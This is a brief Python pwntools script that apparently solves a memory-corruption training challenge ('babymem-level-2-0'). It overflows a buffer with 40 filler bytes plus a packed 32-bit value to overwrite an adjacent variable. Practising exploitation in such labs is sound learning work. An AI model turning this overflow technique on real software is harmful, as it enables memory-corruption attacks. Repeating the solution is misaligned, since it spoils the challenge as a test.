import pwn

p = pwn.process("/challenge/babymem-level-2-0")

p.readline(b"size: ")
p.writeline("44")

p.readline(b"bytes)!")
val = pwn.p32(0x0039746a)
p.write(b"A"*40+val)

print(p.readall().decode("utf-8"))
